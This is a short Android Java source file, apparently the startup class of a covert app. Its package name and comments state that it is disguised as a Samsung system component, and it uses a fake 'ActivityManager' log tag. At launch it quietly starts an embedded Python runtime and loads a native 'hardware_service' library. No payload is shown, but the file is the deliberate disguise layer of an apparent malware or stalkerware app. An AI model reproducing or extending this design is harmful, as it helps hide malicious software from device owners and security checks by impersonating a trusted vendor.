package com.samsung.android.service;

import android.app.Application;
import android.util.Log;

import com.chaquo.python.Python;
import com.chaquo.python.android.AndroidPlatform;

/**
 * System Helper Application
 * Disguised as Samsung system component
 */
public class AetherApplication extends Application {
    private static final String TAG = "ActivityManager";
    
    @Override
    public void onCreate() {
        super.onCreate();
        Log.d(TAG, "System helper initialized");
        
        // Initialize ChaquoPy
        if (!Python.isAppThread()) {
            Python.start(new AndroidPlatform(this));
            Log.d(TAG, "ChaquoPy initialized");
        }
        
        // Initialize native components
        try {
            System.loadLibrary("hardware_service");
            Log.d(TAG, "Native library loaded successfully");
        } catch (UnsatisfiedLinkError e) {
            Log.e(TAG, "Failed to load native library: " + e.getMessage());
        }
    }
}